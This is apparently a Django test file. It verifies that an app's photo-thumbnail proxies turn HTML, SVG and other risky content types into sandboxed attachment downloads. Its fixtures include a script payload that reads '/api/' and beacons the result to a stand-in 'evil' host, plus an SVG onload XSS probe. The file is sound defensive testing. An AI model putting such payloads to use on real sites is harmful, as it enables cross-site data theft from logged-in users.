"""The login-gated thumbnail proxies never hand a browser a document on the app origin.

The attack: an Immich server (the user's own, or one they were pointed at), Google Photos' declared
``mimeType``, or a Places photo source labels a body ``text/html`` or ``image/svg+xml``. Served verbatim,
it renders as a page on this origin with the viewer's session.
"""

from __future__ import annotations

import hashlib
from typing import TYPE_CHECKING
from unittest import mock
from urllib.parse import quote

from django.conf import settings as django_settings
from django.contrib.auth.models import User
from django.core.cache import cache, caches
from django.urls import reverse
from model_bakery import baker

from urbanlens.core.tests.testcase import TestCase
from urbanlens.dashboard.controllers.media_auth import PRIVATE_MEDIA_MAX_AGE_SECONDS
from urbanlens.dashboard.controllers.media_proxy import sign_photo_name
from urbanlens.dashboard.models.google_photos.model import GooglePhotosAccount
from urbanlens.dashboard.models.immich.model import ImmichAccount
from urbanlens.dashboard.models.pin_suggestions.model import PinSuggestion, PinSuggestionOrigin
from urbanlens.dashboard.services.apis.photos.google import session_items_cache_key
from urbanlens.UrbanLens.settings.app import settings as app_settings

if TYPE_CHECKING:
    from collections.abc import Callable

    from django.test.client import _MonkeyPatchedWSGIResponse as HttpResponse

_HTML = b"<html><body><script>fetch('/api/').then(r => r.text()).then(t => navigator.sendBeacon('//evil', t))</script></body></html>"
_SVG = b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>'
_JPEG = b"\xff\xd8\xff\xe0jpeg-bytes"

HOSTILE = (
    (_HTML, "text/html"),
    (_HTML, "text/html; charset=utf-8"),
    (_HTML, "application/xhtml+xml"),
    (_SVG, "image/svg+xml"),
    (_SVG, "text/xml"),
    (_HTML, "application/pdf"),
    (_HTML, ""),
)

_SESSION = "sess1"
_ITEM = "item1"
_ASSET = "a1"
_PHOTO = "places/ABC/photos/XYZ"


def _proxied_cache():
    return caches[django_settings.PROXIED_BYTES_CACHE]


class _ProxyCase(TestCase):
    def setUp(self) -> None:
        super().setUp()
        self.user = baker.make(User)
        self.profile = self.user.profile
        self.client.force_login(self.user)

    def assert_inert_download(self, response: HttpResponse) -> None:
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response["Content-Type"], "application/octet-stream")
        self.assertTrue(response["Content-Disposition"].startswith("attachment"), response["Content-Disposition"])
        self.assertEqual(response["X-Content-Type-Options"], "nosniff")
        self.assertIn("default-src 'none'", response["Content-Security-Policy"])
        self.assertIn("sandbox", response["Content-Security-Policy"])
        self.assert_private(response)

    def assert_inline_image(self, response: HttpResponse) -> None:
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.content, _JPEG)
        self.assertEqual(response["Content-Type"], "image/jpeg")
        self.assertNotIn("Content-Disposition", response)
        self.assertEqual(response["X-Content-Type-Options"], "nosniff")
        self.assertIn("default-src 'none'", response["Content-Security-Policy"])
        self.assert_private(response)

    def assert_private(self, response: HttpResponse) -> None:
        self.assertEqual(response["Cache-Control"], f"private, max-age={PRIVATE_MEDIA_MAX_AGE_SECONDS}")

    def check_hostile(self, fetch: Callable[[bytes, str], HttpResponse]) -> None:
        for body, content_type in HOSTILE:
            with self.subTest(content_type=content_type, body=body[:5]):
                cache.clear()
                _proxied_cache().clear()
                self.prime()
                self.assert_inert_download(fetch(body, content_type))

    def prime(self) -> None:
        """Re-establish whatever per-test cache state the view needs besides its bytes cache."""


class ImmichThumbnailTests(_ProxyCase):
    def setUp(self) -> None:
        super().setUp()
        self.account = ImmichAccount.objects.create(
            profile=self.profile, server_url="https://photos.example.com", api_key="k"
        )
        self.pin = baker.make_recipe("dashboard.pin", profile=self.profile)
        self.url = reverse("pin.immich.thumbnail", args=[self.pin.slug, _ASSET])

    def fetch(self, body: bytes, content_type: str) -> HttpResponse:
        with mock.patch(
            "urbanlens.dashboard.controllers.immich.ImmichGateway.get_asset_thumbnail",
            return_value=(body, content_type),
        ):
            return self.client.get(self.url)

    def test_hostile_types_are_downloads(self) -> None:
        self.check_hostile(self.fetch)

    def test_a_hostile_type_already_cached_is_still_a_download(self) -> None:
        _proxied_cache().set(f"ul_immich_thumb_{self.account.pk}_{_ASSET}", (_SVG, "image/svg+xml"))
        with mock.patch(
            "urbanlens.dashboard.controllers.immich.ImmichGateway.get_asset_thumbnail",
            side_effect=AssertionError("cache missed"),
        ):
            self.assert_inert_download(self.client.get(self.url))

    def test_an_image_stays_inline(self) -> None:
        self.assert_inline_image(self.fetch(_JPEG, "image/jpeg"))

    def test_a_second_request_is_served_from_the_cache(self) -> None:
        with mock.patch(
            "urbanlens.dashboard.controllers.immich.ImmichGateway.get_asset_thumbnail",
            return_value=(_JPEG, "image/jpeg"),
        ) as fetched:
            self.client.get(self.url)
            self.assert_inline_image(self.client.get(self.url))
        self.assertEqual(fetched.call_count, 1)


class PinSuggestionImmichThumbnailTests(_ProxyCase):
    def setUp(self) -> None:
        super().setUp()
        self.account = ImmichAccount.objects.create(
            profile=self.profile, server_url="https://photos.example.com", api_key="k"
        )
        suggestion = PinSuggestion.objects.create(
            profile=self.profile,
            pin=None,
            latitude=40.0,
            longitude=-75.0,
            origin=PinSuggestionOrigin.IMMICH,
            visit_dates=["2024-01-01"],
            sample_assets=[{"asset_id": _ASSET, "taken_at": "2024-01-01"}],
        )
        self.url = reverse("memories.locations.immich_thumbnail", args=[suggestion.pk, _ASSET])

    def fetch(self, body: bytes, content_type: str) -> HttpResponse:
        with mock.patch(
            "urbanlens.dashboard.controllers.pin_suggestions.ImmichGateway.get_asset_thumbnail",
            return_value=(body, content_type),
        ):
            return self.client.get(self.url)

    def test_hostile_types_are_downloads(self) -> None:
        self.check_hostile(self.fetch)

    def test_a_hostile_type_the_pin_view_cached_is_still_a_download(self) -> None:
        """Both views share one cache key, so either one's entry reaches the other."""
        _proxied_cache().set(f"ul_immich_thumb_{self.account.pk}_{_ASSET}", (_HTML, "text/html"))
        with mock.patch(
            "urbanlens.dashboard.controllers.pin_suggestions.ImmichGateway.get_asset_thumbnail",
            side_effect=AssertionError("cache missed"),
        ):
            self.assert_inert_download(self.client.get(self.url))

    def test_an_image_stays_inline(self) -> None:
        self.assert_inline_image(self.fetch(_JPEG, "image/jpeg"))


class GooglePhotosThumbnailTests(_ProxyCase):
    def setUp(self) -> None:
        super().setUp()
        GooglePhotosAccount.objects.create(profile=self.profile, access_token="a", refresh_token="r")
        pin = baker.make_recipe("dashboard.pin", profile=self.profile)
        self.url = reverse("pin.google_photos.thumbnail", args=[pin.slug, _SESSION, _ITEM])
        self.mime_type = "image/jpeg"
        self.prime()

    def prime(self) -> None:
        cache.set(f"ul_gphotos_session_owner_{_SESSION}", self.profile.id)
        cache.set(
            session_items_cache_key(_SESSION),
            {_ITEM: {"base_url": "https://lh3.example/x", "mime_type": self.mime_type, "filename": "x"}},
        )

    def fetch(self, body: bytes, content_type: str) -> HttpResponse:
        self.mime_type = content_type
        self.prime()
        with mock.patch(
            "urbanlens.dashboard.controllers.google_photos.GooglePhotosGateway.download_media_item", return_value=body
        ):
            return self.client.get(self.url)

    def test_hostile_types_are_downloads(self) -> None:
        self.check_hostile(self.fetch)

    def test_a_hostile_type_already_cached_is_still_a_download(self) -> None:
        _proxied_cache().set(f"ul_gphotos_thumb_{_SESSION}_{_ITEM}", (_SVG, "image/svg+xml"))
        with mock.patch(
            "urbanlens.dashboard.controllers.google_photos.GooglePhotosGateway.download_media_item",
            side_effect=AssertionError("cache missed"),
        ):
            self.assert_inert_download(self.client.get(self.url))

    def test_an_image_stays_inline(self) -> None:
        self.assert_inline_image(self.fetch(_JPEG, "image/jpeg"))

    def test_a_second_request_is_served_from_the_cache(self) -> None:
        with mock.patch(
            "urbanlens.dashboard.controllers.google_photos.GooglePhotosGateway.download_media_item", return_value=_JPEG
        ) as fetched:
            self.client.get(self.url)
            self.assert_inline_image(self.client.get(self.url))
        self.assertEqual(fetched.call_count, 1)


class GoogleMapsPhotoProxyTests(_ProxyCase):
    def setUp(self) -> None:
        super().setUp()
        patcher = mock.patch.object(app_settings, "google_unrestricted_api_key", "fake-key")
        patcher.start()
        self.addCleanup(patcher.stop)
        self.url = (
            reverse("media.google_maps_photo", args=[quote(_PHOTO, safe="")])
            + f"?sig={quote(sign_photo_name(_PHOTO), safe='')}"
        )

    def fetch(self, body: bytes, content_type: str) -> HttpResponse:
        with mock.patch(
            "urbanlens.dashboard.services.apis.locations.places_resolution.download_photo",
            return_value=(body, content_type),
        ):
            return self.client.get(self.url)

    def test_hostile_types_are_downloads(self) -> None:
        self.check_hostile(self.fetch)

    def test_a_hostile_type_already_cached_is_still_a_download(self) -> None:
        cache.set(f"ul_gmaps_photo_{hashlib.sha256(quote(_PHOTO, safe='').encode()).hexdigest()}", (_HTML, "text/html"))
        cache.set(f"ul_gmaps_photo_{hashlib.sha256(_PHOTO.encode()).hexdigest()}", (_HTML, "text/html"))
        with mock.patch(
            "urbanlens.dashboard.services.apis.locations.places_resolution.download_photo",
            side_effect=AssertionError("cache missed"),
        ):
            self.assert_inert_download(self.client.get(self.url))

    def test_an_image_stays_inline(self) -> None:
        self.assert_inline_image(self.fetch(_JPEG, "image/jpeg"))
